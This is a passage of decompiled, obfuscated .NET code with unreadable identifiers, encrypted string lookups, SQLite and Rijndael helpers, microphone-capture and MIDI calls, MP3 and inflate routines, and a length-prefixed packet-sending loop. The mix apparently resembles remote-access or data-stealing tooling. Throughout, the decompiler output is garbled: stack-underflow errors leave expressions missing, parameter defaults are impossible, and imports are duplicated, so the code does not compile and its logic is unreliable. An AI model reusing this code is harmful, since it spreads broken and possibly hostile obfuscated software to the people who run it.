			if (((global::_0017._007F._000E)/*Error near IL_000a: Stack underflow*/)._0003 >= 8)
			{
				_ = ((global::_0017._007F._000E)/*Error near IL_0017: Stack underflow*/)._0001;
				int num = _0002._0002;
				((global::_0017._007F._000E)/*Error near IL_002b: Stack underflow*/)._0002 = num + 1;
				uint num2 = _0002._0001;
				((sbyte[])/*Error near IL_0034: Stack underflow*/)[num] = (sbyte)(byte)num2;
				_0002._0001 >>= 8;
				_0002._0003 -= 8;
			}
			if (P_3 > _0002._0002 - _0002._0001)
			{
				P_3 = _0002._0002 - _0002._0001;
				Array.Copy(_0002._0001, _0002._0001, _0003, _0004, P_3);
				_0002._0001 = 0;
				_0002._0002 = 0;
			}
			else
			{
				Array.Copy(_0002._0001, _0002._0001, _0003, _0004, P_3);
				_0002._0001 += P_3;
			}
			return P_3;
		}

		static void _0001(_001D._0016 _0002, float _0003, float _0004, float P_3)
		{
			//IL_0014: Unknown result type (might be due to invalid IL or missing references)
			//IL_001b: Unknown result type (might be due to invalid IL or missing references)
			//IL_001c: Unknown result type (might be due to invalid IL or missing references)
			//IL_00a5: Incompatible stack heights: 0 vs 3
			//IL_00ab: Incompatible stack heights: 0 vs 2
			//IL_00b5: Expected F8, but got Unknown
			//IL_00b5: Incompatible stack heights: 0 vs 2
			_ = global::_0015._009B_0002;
			_ = Math.PI * 2.0;
			double num = (double)/*Error near IL_0014: Stack underflow*/;
			_ = /*Error near IL_0015: Stack underflow*/* num;
			double num2 = (double)/*Error near IL_001b: Stack underflow*/;
			Math.Cos(/*Error near IL_001c: Stack underflow*/ / num2);
			double num3 = (double)/*Error near IL_0023: Stack underflow*/;
			double num4 = /*Error near IL_0028: Stack underflow*/((double)/*Error near IL_0028: Stack underflow*/) / (double)(2f * P_3);
			double num5 = (1.0 + num3) / 2.0;
			double num6 = 0.0 - (1.0 + num3);
			double num7 = (1.0 + num3) / 2.0;
			double num8 = 1.0 + num4;
			double num9 = -2.0 * num3;
			double num10 = 1.0 - num4;
			_0018._0001(num5, _0002, num7, num9, num8, num10, num6);
		}

		static ICryptoTransform _0001(bool _0002, byte[] _0003, byte[] _0004)
		{
			//IL_001e: Incompatible stack heights: 0 vs 1
			//IL_0031: Incompatible stack heights: 0 vs 1
			new RijndaelManaged();
			using SymmetricAlgorithm symmetricAlgorithm = /*Error near IL_0034: Stack underflow*/;
			return ((int)/*Error near IL_0008: Stack underflow*/ != 0) ? symmetricAlgorithm.CreateDecryptor(_0003, _0004) : symmetricAlgorithm.CreateEncryptor(_0003, _0004);
		}

		static byte[] _0001(string _0002)
		{
			//IL_0016: Incompatible stack heights: 0 vs 1
			//IL_0019: Incompatible stack heights: 0 vs 3
			//IL_0020: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0)
			{
				return null;
			}
			_ = _0087_0003._007E_0081_0007;
			_ = _001C._0018._0001;
			/*Error near IL_0020: Stack underflow*/((object)/*Error near IL_0020: Stack underflow*/, (string)/*Error near IL_0020: Stack underflow*/);
			return (byte[])/*Error near IL_0015: Stack underflow*/;
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_trace")]
		static extern IntPtr _0001(IntPtr _0002, global::_0010._001D _0003, IntPtr _0004);

		static global::_0010._001C _0001(bool _0002, _001D._0019 P_1)
		{
			//IL_0018: Incompatible stack heights: 0 vs 1
			//IL_0022: Incompatible stack heights: 0 vs 2
			_0018._0001((_001D._0019)/*Error near IL_001f: Stack underflow*/);
			_ = _009F_0005._0092_000F;
			return (global::_0010._001C)/*Error near IL_0011: Stack underflow*/((object)/*Error near IL_0011: Stack underflow*/, _0002);
		}

		[DllImport("winmm.dll", EntryPoint = "midiOutMessage")]
		static extern MmResult _0001(IntPtr _0002, int _0003, IntPtr _0004, IntPtr _0005);

		static IntPtr _0001(string _0002)
		{
			//IL_0065: Incompatible stack heights: 0 vs 1
			//IL_006b: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0)
			{
				return IntPtr.Zero;
			}
			IntPtr zero = IntPtr.Zero;
			byte[] array = _0018._0001((string)/*Error near IL_0018: Stack underflow*/);
			if (array == null)
			{
				return IntPtr.Zero;
			}
			int num = array.Length;
			zero = _0018._0001(num + 1);
			if (_0090_0002._009A_0005(zero, IntPtr.Zero))
			{
				return IntPtr.Zero;
			}
			_0088_0005._0017_000F(array, 0, zero, num);
			_0097_0006._008C_0010(zero, num, 0);
			return zero;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static byte _0001(short _0002)
		{
			//IL_0003: Unknown result type (might be due to invalid IL or missing references)
			//IL_0009: Unknown result type (might be due to invalid IL or missing references)
			//IL_000a: Unknown result type (might be due to invalid IL or missing references)
			//IL_000f: Unsupported input type for neg.
			//IL_000f: Unknown result type (might be due to invalid IL or missing references)
			//IL_004b: Unknown result type (might be due to invalid IL or missing references)
			//IL_004d: Unknown result type (might be due to invalid IL or missing references)
			//IL_004e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0052: Incompatible stack heights: 0 vs 1
			//IL_0055: Incompatible stack heights: 0 vs 2
			//IL_0059: Incompatible stack heights: 1 vs 0
			_003F val = (/*Error near IL_0004: Stack underflow*/ >> 8) & 0x80;
			if ((int)val != 0)
			{
				_0002 = (short)(0 - /*Error near IL_0010: Stack underflow*/);
			}
			if (_0002 > 32635)
			{
				_0002 = 32635;
			}
			_0002 = (short)(_0002 + 132);
			int num = global::_0007._0018._0001[(_0002 >> 7) & 0xFF];
			int num2 = (_0002 >> num + 3) & 0xF;
			return (byte)(~(val | (num << 4) | num2));
		}

		static bool _0001(byte[] _0002, global::_0005._0003 _0003)
		{
			//IL_01f0: Incompatible stack heights: 0 vs 1
			//IL_01f6: Incompatible stack heights: 0 vs 1
			//IL_01fc: Incompatible stack heights: 0 vs 1
			if (((byte[])/*Error near IL_0007: Stack underflow*/)[0] == byte.MaxValue && (((byte[])/*Error near IL_0018: Stack underflow*/)[1] & 0xE0) == 224)
			{
				byte num = _0002[1];
				((global::_0005._0003)/*Error near IL_003a: Stack underflow*/).MpegVersion = (global::_0004._0006)((num & 0x18) >> 3);
				if (_0003.MpegVersion == global::_0004._0006._0002)
				{
					return false;
				}
				_0003.MpegLayer = (global::_0001._0005)((_0002[1] & 6) >> 1);
				if (_0003.MpegLayer == global::_0001._0005._0001)
				{
					return false;
				}
				int num2 = ((_0003.MpegLayer != global::_0001._0005._0004) ? ((_0003.MpegLayer == global::_0001._0005._0003) ? 1 : 2) : 0);
				_0003.CrcPresent = (_0002[1] & 1) == 0;
				_0003.BitRateIndex = (_0002[2] & 0xF0) >> 4;
				if (_0003.BitRateIndex == 15)
				{
					return false;
				}
				int num3 = ((_0003.MpegVersion != global::_0004._0006._0004) ? 1 : 0);
				_0003.BitRate = global::_0005._0003._0001[num3, num2, _0003.BitRateIndex] * 1000;
				if (_0003.BitRate == 0)
				{
					return false;
				}
				int num4 = (_0002[2] & 0xC) >> 2;
				if (num4 == 3)
				{
					return false;
				}
				if (_0003.MpegVersion == global::_0004._0006._0004)
				{
					_0003.SampleRate = global::_0005._0003._0001[num4];
				}
				else if (_0003.MpegVersion == global::_0004._0006._0003)
				{
					_0003.SampleRate = global::_0005._0003._0002[num4];
				}
				else
				{
					_0003.SampleRate = global::_0005._0003._0003[num4];
				}
				bool flag = (_0002[2] & 2) == 2;
				_ = _0002[2];
				_0003.ChannelMode = (ChannelMode)((_0002[3] & 0xC0) >> 6);
				_0003.ChannelExtension = (_0002[3] & 0x30) >> 4;
				if (_0003.ChannelExtension != 0 && _0003.ChannelMode != ChannelMode.JointStereo)
				{
					return false;
				}
				_0003.Copyright = (_0002[3] & 8) == 8;
				_ = _0002[3];
				_ = _0002[3];
				int num5 = (flag ? 1 : 0);
				_0003.SampleCount = global::_0005._0003._0001[num3, num2];
				int num6 = _0003.SampleCount / 8;
				if (_0003.MpegLayer == global::_0001._0005._0004)
				{
					_0003.FrameLength = (num6 * _0003.BitRate / _0003.SampleRate + num5) * 4;
				}
				else
				{
					_0003.FrameLength = num6 * _0003.BitRate / _0003.SampleRate + num5;
				}
				if (_0003.FrameLength > 16384)
				{
					return false;
				}
				return true;
			}
			return false;
		}

		[DllImport("winmm.dll", EntryPoint = "midiOutLongMsg")]
		static extern MmResult _0001(IntPtr _0002, [MarshalAs(UnmanagedType.Struct)] ref global::_0018._0012._0007 _0003, int _0004);

		static void _0001(global::_0008._0001 P_0)
		{
			//IL_0083: Incompatible stack heights: 0 vs 2
			//IL_008d: Incompatible stack heights: 0 vs 3
			//IL_0097: Incompatible stack heights: 0 vs 1
			try
			{
				_ = global::_0011._008E_0002;
				_0018._0001();
				_ = global::_0015._0001._0006;
				_ = global::_0002._007E_0006;
				_0080._0014._0001(107362089);
				/*Error near IL_0097: Stack underflow*/((object)/*Error near IL_0097: Stack underflow*/);
				string text = /*Error near IL_0021: Stack underflow*/((string)/*Error near IL_0021: Stack underflow*/, (string)/*Error near IL_0021: Stack underflow*/, (string)/*Error near IL_0021: Stack underflow*/);
				_0018._0001(text, global::_0002._007E_0006(_0080._0014._0001(107379563)));
				if (_0010_0003._008C_0006(text, global::_0015._0001._0008))
				{
					global::_0007._0096(50);
					_000F_0005._0095_000E(text, _0015_0005._009D_000E(global::_0015._0001._0008));
				}
			}
			catch
			{
			}
		}

		static void _0001(long _0002, long _0003, float _0004, _001D._0015 _0005, long _0006, float _0007, float[] P_6)
		{
			//IL_0011: Unknown result type (might be due to invalid IL or missing references)
			//IL_0014: Expected I8, but got Unknown
			//IL_048f: Incompatible stack heights: 0 vs 1
			//IL_049d: Incompatible stack heights: 0 vs 1
			float[] array = (float[])/*Error near IL_0496: Stack underflow*/;
			long num = /*Error near IL_0012: Stack underflow*// 2;
			long num2 = _0006 / _0002;
			double num3 = (double)_0007 / (double)_0006;
			double num4 = Math.PI * 2.0 * (double)num2 / (double)_0006;
			long num5 = _0006 - num2;
			if (_0005._0001 == 0L)
			{
				_0005._0001 = num5;
			}
			for (long num6 = 0L; num6 < _0003; num6++)
			{
				_0005._0001[_0005._0001] = P_6[num6];
				array[num6] = _0005._0002[_0005._0001 - num5];
				_0005._0001++;
				if (_0005._0001 < _0006)
				{
					continue;
				}
				_0005._0001 = num5;
				for (long num7 = 0L; num7 < _0006; num7++)
				{
					double num8 = -0.5 * global::_0015._009A_0002(Math.PI * 2.0 * (double)num7 / (double)_0006) + 0.5;
					_0005._0003[2 * num7] = (float)((double)_0005._0001[num7] * num8);
					_0005._0003[2 * num7 + 1] = 0f;
				}
				_0018._0001(_0006, _0005._0003, -1L, _0005);
				for (long num7 = 0L; num7 <= num; num7++)
				{
					double num9 = _0005._0003[2 * num7];
					double num10 = _0005._0003[2 * num7 + 1];
					double num11 = 2.0 * global::_0015._009F_0002(num9 * num9 + num10 * num10);
					double num12 = global::_0014._0097_0002(num10, num9);
					double num13 = num12 - (double)_0005._0004[num7];
					_0005._0004[num7] = (float)num12;
					num13 -= (double)num7 * num4;
					long num14 = (long)(num13 / Math.PI);
					num14 = ((num14 < 0) ? (num14 - (num14 & 1)) : (num14 + (num14 & 1)));
					num13 -= Math.PI * (double)num14;
					num13 = (double)_0002 * num13 / (Math.PI * 2.0);
					num13 = (double)num7 * num3 + num13 * num3;
					_0005._0008[num7] = (float)num11;
					_0005._0007[num7] = (float)num13;
				}
				for (int i = 0; i < _0006; i++)
				{
					_0005._000F[i] = 0f;
					_0005._000E[i] = 0f;
				}
				for (long num7 = 0L; num7 <= num; num7++)
				{
					long num15 = (long)((float)num7 * _0004);
					if (num15 <= num)
					{
						_0005._000F[num15] += _0005._0008[num7];
						_0005._000E[num15] = _0005._0007[num7] * _0004;
					}
				}
				for (long num7 = 0L; num7 <= num; num7++)
				{
					double num11 = _0005._000F[num7];
					double num13 = _0005._000E[num7];
					num13 -= (double)num7 * num3;
					num13 /= num3;
					num13 = Math.PI * 2.0 * num13 / (double)_0002;
					num13 += (double)num7 * num4;
					_0005._0005[num7] += (float)num13;
					double num12 = _0005._0005[num7];
					_0005._0003[2 * num7] = (float)(num11 * global::_0015._009A_0002(num12));
					_0005._0003[2 * num7 + 1] = (float)(num11 * global::_0015._009B_0002(num12));
				}
				for (long num7 = _0006 + 2; num7 < 2 * _0006; num7++)
				{
					_0005._0003[num7] = 0f;
				}
				_0018._0001(_0006, _0005._0003, 1L, _0005);
				for (long num7 = 0L; num7 < _0006; num7++)
				{
					double num8 = -0.5 * global::_0015._009A_0002(Math.PI * 2.0 * (double)num7 / (double)_0006) + 0.5;
					_0005._0006[num7] += (float)(2.0 * num8 * (double)_0005._0003[2 * num7] / (double)(num * _0002));
				}
				for (long num7 = 0L; num7 < num2; num7++)
				{
					_0005._0002[num7] = _0005._0006[num7];
				}
				for (long num7 = 0L; num7 < _0006; num7++)
				{
					_0005._0006[num7] = _0005._0006[num7 + num2];
				}
				for (long num7 = 0L; num7 < num5; num7++)
				{
					_0005._0001[num7] = _0005._0001[num7 + num2];
				}
			}
		}

		static IntPtr _0001(string _0002)
		{
			//IL_0006: Incompatible stack heights: 0 vs 1
			//IL_000d: Incompatible stack heights: 0 vs 1
			_0018._0001((string)/*Error near IL_000d: Stack underflow*/);
			return (IntPtr)/*Error near IL_0005: Stack underflow*/;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static long _0001(global::_0005._0005 _0002, int _0003)
		{
			//IL_0009: Unknown result type (might be due to invalid IL or missing references)
			//IL_0012: Unknown result type (might be due to invalid IL or missing references)
			//IL_0014: Expected I8, but got Unknown
			//IL_0015: Incompatible stack heights: 0 vs 2
			//IL_0018: Incompatible stack heights: 0 vs 2
			_ = 10000000;
			long num = (long)/*Error near IL_0009: Stack underflow*/;
			_ = /*Error near IL_000a: Stack underflow*/* num;
			int num2 = ((global::_0005._0005)/*Error near IL_0011: Stack underflow*/)._0002;
			return /*Error near IL_0013: Stack underflow*// num2;
		}

		static void _0001(global::_0004._0001 P_0)
		{
			//IL_007d: Incompatible stack heights: 0 vs 1
			//IL_0087: Incompatible stack heights: 0 vs 3
			//IL_008e: Incompatible stack heights: 0 vs 3
			try
			{
				_000E_0005._0094_000E(global::_0015._0001._0005);
				if (((Array)/*Error near IL_000f: Stack underflow*/).Length == 0)
				{
					_ = global::_001C._0097_0003;
					_ = global::_0011._008E_0002;
					_0018._0001();
					_ = global::_0015._0001._0005;
					_ = global::_0002._007E_0006;
					_0080._0014._0001(107362089);
					string text = /*Error near IL_0033: Stack underflow*/((object)/*Error near IL_0033: Stack underflow*/);
					string text2 = /*Error near IL_0038: Stack underflow*/((string)/*Error near IL_0038: Stack underflow*/, (string)/*Error near IL_0038: Stack underflow*/, text);
					if (/*Error near IL_003d: Stack underflow*/(text2))
					{
						_0018._0001(P_0, global::_0011._008E_0002(_0018._0001(), global::_0015._0001._0005, global::_0002._007E_0006(_0080._0014._0001(107362089))));
					}
				}
			}
			catch
			{
			}
		}

		static long _0001(int _0002, _001E._0004 P_1)
		{
			//IL_001a: Incompatible stack heights: 0 vs 2
			//IL_001d: Incompatible stack heights: 0 vs 2
			//IL_0024: Incompatible stack heights: 0 vs 1
			_ = global::_0007._0097;
			_ = ((_001E._0004)/*Error near IL_000c: Stack underflow*/)._0001;
			((global::_0013._0005)/*Error near IL_0024: Stack underflow*/)._0001((int)/*Error near IL_0024: Stack underflow*/, out long result);
			/*Error near IL_0017: Stack underflow*/((int)/*Error near IL_0017: Stack underflow*/);
			return result;
		}

		static void _0001(int _0002, string _0003, global::_0006._0004 P_2)
		{
			//IL_0026: Incompatible stack heights: 0 vs 1
			//IL_0029: Incompatible stack heights: 0 vs 1
			//IL_0030: Incompatible stack heights: 0 vs 1
			if (((global::_0006._0004)/*Error near IL_0007: Stack underflow*/)._0001 == null)
			{
				new global::_0005._0007();
				((global::_0006._0004)/*Error near IL_0012: Stack underflow*/)._0001 = (global::_0005._0007)/*Error near IL_0012: Stack underflow*/;
			}
			_0018._0001(P_2._0001, new global::_0018._000F(_0002, _0003));
		}

		static void _0001(global::_0002._0008 P_0)
		{
			//IL_0014: Incompatible stack heights: 0 vs 1
			//IL_0017: Incompatible stack heights: 0 vs 1
			if (((global::_0002._0008)/*Error near IL_0007: Stack underflow*/)._0001 != null)
			{
				_0018._0001(((global::_0002._0008)/*Error near IL_0010: Stack underflow*/)._0001);
			}
		}

		static bool _0001(global::_0008._0001 _0002, byte[] _0003, string _0004 = false, bool P_3)
		{
			//IL_016b: Incompatible stack heights: 0 vs 1
			//IL_0175: Incompatible stack heights: 0 vs 2
			//IL_017b: Incompatible stack heights: 0 vs 1
			try
			{
				_ = ((global::_0008._0001)/*Error near IL_000c: Stack underflow*/)._0001;
				_0016_0005._009F_000E();
				((global::_0004._0001)/*Error near IL_001b: Stack underflow*/)._0001 = (DateTime)/*Error near IL_001b: Stack underflow*/;
				if (((global::_0008._0001)/*Error near IL_0025: Stack underflow*/)._0003)
				{
					return false;
				}
				_0002._0003 = true;
				byte[] array = _0018._0001(_0004);
				int num = 0;
				int num2 = 5;
				byte[] array2 = null;
				if (_0003 != null)
				{
					array2 = _0012_0003._008E_0006(_0003.Length);
					num = _0003.Length;
					num2 = 10;
				}
				byte[] array3 = _0012_0003._008E_0006(array.Length);
				byte[] array4 = new byte[num2 + array.Length + num];
				_001F_0004._007E_008C_0008(array3, array4, 0);
				_001F_0004._007E_008C_0008(array, array4, 5);
				if (_0003 != null)
				{
					_001F_0004._007E_008C_0008(array2, array4, 5 + array.Length);
					_001F_0004._007E_008C_0008(_0003, array4, 10 + array.Length);
				}
				int num3 = 0;
				int num4 = array4.Length;
				while (num4 > 0 && !_0002._0006)
				{
					int num5 = ((num4 > _0002._0003) ? _0002._0003 : num4);
					_0083._007E_0008_0004(_0002._0001, array4, num3, num5);
					num3 += num5;
					num4 -= num5;
					_0002._0001._0001 = _0016_0005._009F_000E();
				}
				_0002._0003 = false;
				if (_0002._0006)
				{
					return false;
				}
				return true;
			}
			catch (Exception)
			{
				_0002._0003 = false;
				_0002._0007 = false;
				return false;
			}
		}

		static int _0001(int _0002, int _0003, byte[] _0004, global::_0017._007F._0003 P_3)
		{
			//IL_001a: Invalid comparison between Unknown and I4
			//IL_0094: Incompatible stack heights: 0 vs 1
			//IL_00a0: Incompatible stack heights: 0 vs 1
			int num = ((global::_0017._007F._0003)/*Error near IL_000a: Stack underflow*/)._0003;
			int num2 = P_3._0004;
			if ((int)/*Error near IL_001c: Stack underflow*/ > num2)
			{
				_0002 = P_3._0004;
			}
			else
			{
				num = (P_3._0003 - P_3._0004 + _0002) & 0x7FFF;
			}
			int num3 = _0002;
			int num4 = _0002 - num;
			if (num4 > 0)
			{
				Array.Copy(P_3._0001, 32768 - num4, _0004, _0003, num4);
				_0003 += num4;
				_0002 = num;
			}
			Array.Copy(P_3._0001, num - _0002, _0004, _0003, _0002);
			P_3._0004 -= num3;
			if (P_3._0004 < 0)
			{
				throw new InvalidOperationException();
			}
			return num3;
		}

		[DllImport("user32.dll", EntryPoint = "GetCursorInfo")]
		static extern bool _0001(out global::_0002._0001._0001 _0002);

		static void _0001(global::_0004._0001 _0002, int P_1)
		{
			//IL_0024: Incompatible stack heights: 0 vs 3
			//IL_002b: Incompatible stack heights: 0 vs 1
			try
			{
				_ = global::_0008._007E_007F_0002;
				_ = _0098_0006._008D_0010;
				/*Error near IL_002b: Stack underflow*/((int)/*Error near IL_002b: Stack underflow*/);
				/*Error near IL_0032: Stack underflow*/((object)/*Error near IL_0032: Stack underflow*/);
				global::_0007._0096(10);
			}
			catch
			{
			}
		}

		static _001D._0016 _0001(float _0002, float _0003, float _0004)
		{
			//IL_0013: Incompatible stack heights: 0 vs 3
			//IL_0016: Incompatible stack heights: 0 vs 1
			//IL_0019: Incompatible stack heights: 0 vs 1
			new _001D._0016();
			_0018._0001((_001D._0016)/*Error near IL_0011: Stack underflow*/, (float)/*Error near IL_0011: Stack underflow*/, (float)/*Error near IL_0011: Stack underflow*/, (float)/*Error near IL_0011: Stack underflow*/);
			return (_001D._0016)/*Error near IL_0012: Stack underflow*/;
		}

		[DllImport("SQLite.Interop.dll", EntryPoint = "sqlite3_errmsg_interop")]
		static extern IntPtr _0001(IntPtr _0002, ref int _0003);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static AsioError _0001(global::_0017._0015 P_0)
		{
			//IL_0027: Incompatible stack heights: 0 vs 1
			//IL_002a: Incompatible stack heights: 0 vs 2
			//IL_0031: Incompatible stack heights: 0 vs 1
			_ = ((global::_0017._0015)/*Error near IL_0007: Stack underflow*/)._0001._0001;
			IntPtr pUnknown = ((global::_0017._0015)/*Error near IL_0013: Stack underflow*/)._0001;
			/*Error near IL_0031: Stack underflow*/(pUnknown);
			_009B._0090_0004(P_0._0002);
			return (AsioError)/*Error near IL_0026: Stack underflow*/;
		}

		static string _0001(_0014 _0002, int P_1)
		{
			//IL_000c: Invalid comparison between Unknown and I4
			//IL_0043: Incompatible stack heights: 0 vs 1
			//IL_004d: Incompatible stack heights: 0 vs 1
			_0018._0001((_0014)/*Error near IL_004a: Stack underflow*/);
			int num = _0002._0004;
			if ((int)/*Error near IL_000e: Stack underflow*/ >= num && _0002._0001 != null)
			{
				return _0018._0001(_0002._0001, P_1 - _0002._0004);
			}
			return _0002._0001._0001._0003(_0002._0001, P_1);
		}

		[DllImport("SQLite.Interop.dll", EntryPoint = "sqlite3_column_decltype_interop")]
		static extern IntPtr _0001(IntPtr _0002, int _0003, ref int _0004);

		[DllImport("winmm.dll", EntryPoint = "midiStreamRestart")]
		static extern MmResult _0001(IntPtr _0002);

		static object _0001(DbType _0002)
		{
			//IL_000a: Incompatible stack heights: 0 vs 2
			_ = global::_0001._001A._0002;
			return ((object[])/*Error near IL_0008: Stack underflow*/)[/*Error near IL_0008: Stack underflow*/];
		}

		static DbType _0001(global::_0017._0080 _0002)
		{
			//IL_00b4: Incompatible stack heights: 0 vs 1
			//IL_00ba: Incompatible stack heights: 0 vs 1
			SQLiteConnectionFlags sQLiteConnectionFlags = (((int)/*Error near IL_0007: Stack underflow*/ != 0) ? ((global::_0017._0080)/*Error near IL_00c4: Stack underflow*/).Flags : SQLiteConnectionFlags.None);
			if ((sQLiteConnectionFlags & SQLiteConnectionFlags.NoConvertSettings) == SQLiteConnectionFlags.NoConvertSettings)
			{
				return DbType.Object;
			}
			bool flag = false;
			string text = _0080._0014._0001(107379554);
			object obj = null;
			string text2 = null;
			if (_0002 == null || !_0018._0001(_0002, text, (object)text2, ref obj))
			{
				obj = _0018._0001(text, text2);
				if (obj == null)
				{
					obj = DbType.Object;
				}
			}
			else
			{
				flag = true;
			}
			try
			{
				if (!(obj is DbType))
				{
					obj = _0018._0001(_0091._0080_0004(typeof(DbType).TypeHandle), _0018._0001(obj), _0004: true);
					if (!(obj is DbType))
					{
						obj = DbType.Object;
					}
				}
				return (DbType)obj;
			}
			finally
			{
				if (!flag && _0002 != null)
				{
					_0018._0001(_0002, text, obj);
				}
			}
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_db_filename")]
		static extern IntPtr _0001(IntPtr _0002, IntPtr _0003);

		static void _0001([Out] global::_0017._0015 _0002, out int _0003, out int _0004, out int _0005, ref int P_4)
		{
			//IL_0030: Incompatible stack heights: 0 vs 1
			//IL_0033: Incompatible stack heights: 0 vs 1
			//IL_0036: Incompatible stack heights: 0 vs 2
			_ = ((global::_0017._0015)/*Error near IL_0009: Stack underflow*/)._0001._0001;
			IntPtr pUnknown = ((global::_0017._0015)/*Error near IL_0015: Stack underflow*/)._0001;
			AsioError num = /*Error near IL_001f: Stack underflow*/(pUnknown, out _0003, out _0004, out _0005, out P_4);
			string text = _0080._0014._0001(107379541);
			_0018._0001((global::_0017._0015)/*Error near IL_002e: Stack underflow*/, num, text);
		}

		static bool _0001(global::_0017._007F._0001 P_0)
		{
			//IL_01c0: Incompatible stack heights: 0 vs 1
			//IL_01ca: Incompatible stack heights: 0 vs 1
			_0018._0001(((global::_0017._007F._0001)/*Error near IL_000a: Stack underflow*/)._0001);
			int num = default(int);
			if (0 == 0)
			{
				num = (int)/*Error near IL_01d0: Stack underflow*/;
			}
			while (num >= 258)
			{
				switch (P_0._0013)
				{
				case 7:
				{
					int num2;
					while (((num2 = _0018._0001(P_0._0001, P_0._0001)) & -256) == 0)
					{
						_0018._0001(P_0._0001, num2);
						if (--num < 258)
						{
							return true;
						}
					}
					if (num2 < 257)
					{
						if (num2 < 0)
						{
							return false;
						}
						P_0._0002 = null;
						P_0._0001 = null;
						P_0._0013 = 2;
						return true;
					}
					P_0._0015 = global::_0017._007F._0001._0001[num2 - 257];
					P_0._0014 = global::_0017._007F._0001._0002[num2 - 257];
					goto case 8;
				}
				case 8:
					if (P_0._0014 > 0)
					{
						P_0._0013 = 8;
						int num3 = _0018._0001(P_0._0001, P_0._0014);
						if (num3 < 0)
						{
							return false;
						}
						_0018._0001(P_0._0001, P_0._0014);
						P_0._0015 += num3;
					}
					P_0._0013 = 9;
					goto case 9;
				case 9:
				{
					int num2 = _0018._0001(P_0._0002, P_0._0001);
					if (num2 < 0)
					{
						return false;
					}
					P_0._0016 = global::_0017._007F._0001._0003[num2];
					P_0._0014 = global::_0017._007F._0001._0004[num2];
					break;
				}
				case 10:
					break;
				default:
					continue;
				}
				if (P_0._0014 > 0)
				{
					P_0._0013 = 10;
					int num4 = _0018._0001(P_0._0001, P_0._0014);
					if (num4 < 0)
					{
						return false;
					}
					_0018._0001(P_0._0001, P_0._0014);
					P_0._0016 += num4;
				}
				_0018._0001(P_0._0001, P_0._0015, P_0._0016);
				num -= P_0._0015;
				P_0._0013 = 7;
			}
			return true;
		}

		static void _0001(_007F._0014 _0002, global::_0015._0012 P_1)
		{
			//IL_00d6: Incompatible stack heights: 0 vs 1
			//IL_00e0: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0015._0012)/*Error near IL_00e0: Stack underflow*/);
			int num = (int)/*Error near IL_00e6: Stack underflow*/;
			int num2 = 0;
			global::_000F._000F obj = default(global::_000F._000F);
			while (num != 0)
			{
				int num3;
				IntPtr intPtr = _0018._0001(P_1, out num3, ref obj);
				int num4 = num3 * _0002._0001;
				if (_0016_0002._0019_0005(0, _0002._0001.Length - num2) < num4 && num2 > 0)
				{
					if (_0002._0001 != null)
					{
						_0002._0001(_0002, new global::_0001._0006(_0002._0001, num2));
					}
					num2 = 0;
				}
				if ((obj & global::_000F._000F._0003) != global::_000F._000F._0003)
				{
					_0011_0003._008D_0006(intPtr, _0002._0001, num2, num4);
				}
				else
				{
					_0007_0003._0086_0006(_0002._0001, num2, num4);
				}
				num2 += num4;
				_0018._0001(num3, P_1);
				num = _0018._0001(P_1);
			}
			if (_0002._0001 != null)
			{
				_0002._0001(_0002, new global::_0001._0006(_0002._0001, num2));
			}
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(global::_0017._007F._0008 P_0)
		{
			//IL_00d0: Incompatible stack heights: 0 vs 1
			//IL_00d6: Incompatible stack heights: 0 vs 3
			_ = ((global::_0017._007F._0008)/*Error near IL_000a: Stack underflow*/)._0001;
			_ = 32768;
			Array.Copy(destinationArray: ((global::_0017._007F._0008)/*Error near IL_0019: Stack underflow*/)._0001, sourceArray: (Array)/*Error near IL_00e0: Stack underflow*/, sourceIndex: (int)/*Error near IL_00e0: Stack underflow*/, destinationIndex: 0, length: 32768);
			P_0._0011 -= 32768;
			P_0._0014 -= 32768;
			P_0._0013 -= 32768;
			for (int i = 0; i < 32768; i++)
			{
				int num = P_0._0001[i] & 0xFFFF;
				P_0._0001[i] = (short)((num >= 32768) ? (num - 32768) : 0);
			}
			for (int j = 0; j < 32768; j++)
			{
				int num2 = P_0._0002[j] & 0xFFFF;
				P_0._0002[j] = (short)((num2 >= 32768) ? (num2 - 32768) : 0);
			}
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_bind_null")]
		static extern _0080._0017 _0001(IntPtr _0002, int _0003);

		[DllImport("winmm.dll", EntryPoint = "waveInAddBuffer")]
		static extern MmResult _0001(IntPtr _0002, _007F._0006 _0003, int _0004);

		static bool _0001(bool _0002, global::_0017._0080 P_1)
		{
			//IL_0033: Incompatible stack heights: 0 vs 1
			//IL_003d: Incompatible stack heights: 0 vs 1
			if (0 == 0)
			{
				_0018._0001((global::_0017._0080)/*Error near IL_003a: Stack underflow*/);
			}
